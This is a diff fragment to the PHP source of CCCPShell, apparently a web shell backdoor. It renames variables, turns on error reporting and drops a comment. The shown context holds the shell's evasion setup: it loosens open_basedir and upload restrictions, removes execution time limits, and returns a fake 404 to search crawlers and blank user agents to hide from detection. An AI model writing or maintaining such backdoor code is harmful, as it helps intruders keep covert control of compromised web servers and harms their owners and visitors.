@@ -29,7 +29,7 @@ $CCCPmod[] = 'process';
 $CCCPtitle[] = tText('process', 'Process');
 
 // ------ Start CCCPShell
-$tiempoCarga = microtime(true);
+$loadTime = microtime(true);
 $isWIN = DIRECTORY_SEPARATOR === '\\';
 define('DS', DIRECTORY_SEPARATOR);
 define('SROOT', dirname(__file__) . DS);
@@ -50,7 +50,7 @@ ini_restore('open_basedir');
 @ini_alter('file_uploads', 1);
 @ini_alter('allow_url_fopen', 1);
 
-//@error_reporting(7);
+@error_reporting(7);
 @ini_set('memory_limit', '64M'); //change it if phpzip fails
 @set_magic_quotes_runtime(0);
 @set_time_limit(0);
@@ -58,8 +58,8 @@ ini_restore('open_basedir');
 @ini_set('output_buffering', 0);
 @clearstatcache();
 
-$userAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
-if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
+$uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
+if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
     header('HTTP/1.0 404 Not Found');
     exit;
 }
@@ -89,7 +89,6 @@ function mSubmit($v, $o, $nl = false){
 		return "<input type='button' value='$v' onclick='$o;return false;'>";
 }
 
-//$name, $value, $nokey, $selected, $onchange, $title, $newline
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
 	$tmp = '';
 	if ($o) $o = "onchange='$o'";
@@ -2737,7 +2736,7 @@ if (isset($p['me']) && $p['me'] === 'process'){
 
 #Se fini
 if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
-	sAjax($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
+	sAjax($sBuff . mHide('etime', substr((microtime(true) - $loadTime), 0, 4)));
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
